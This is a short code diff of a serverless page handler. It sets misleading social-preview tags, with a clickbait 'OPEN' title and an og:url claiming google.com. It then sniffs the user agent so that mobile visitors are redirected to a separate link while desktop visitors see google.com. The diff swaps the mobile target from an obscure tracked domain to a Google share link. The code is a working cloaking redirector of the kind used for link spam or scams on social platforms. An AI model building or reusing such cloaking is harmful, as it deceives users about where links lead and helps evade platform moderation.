@@ -14,7 +14,7 @@ export async function onRequest(context) {
     <title>Welcome</title>
     <meta property="og:title" content="🎬O▂P▂▂E▂N🎬">
     <meta property="og:description" content="">
-    <meta property="og:image" content="https://web.facebook.com/photo/?fbid=122109547551450292&set=a.122095068525450292">
+    <meta property="og:image" content="https://web.facebook.com/photo/?fbid=122109547551450292">
     <meta property="og:url" content="https://www.google.com">
     <meta property="og:type" content="website">
 </head>
@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://acorntar.com/mxxcdagb?key=e6e8236c6980d94ca8e81d0b03ea93df", 302);
+    return Response.redirect("https://www.google.com/share.google?q=nNIxuAhTzh80F6hcT", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
